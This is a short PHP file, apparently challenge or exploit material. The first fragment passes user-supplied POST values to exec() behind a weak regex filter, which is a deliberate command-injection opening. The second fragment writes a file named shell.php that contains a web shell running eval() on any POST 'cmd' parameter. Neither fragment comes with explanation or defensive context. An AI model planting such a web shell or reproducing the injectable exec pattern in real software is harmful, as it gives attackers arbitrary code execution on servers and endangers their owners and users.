<?php


    $name = $_POST['name'];
    for ( $i=0; $i<count($name); $i++ ){
        if ( !preg_match('/^\w+$/', $name[$i]) ){
             echo "hacker!";
             exit();
           }
    }

    exec('echo' . implode(" ", $name));
?>
<?php
file_put_contents('shell.php', '
<?php
header("Content-Type: text/plain");
print eval($_POST["cmd"]);
?>
');
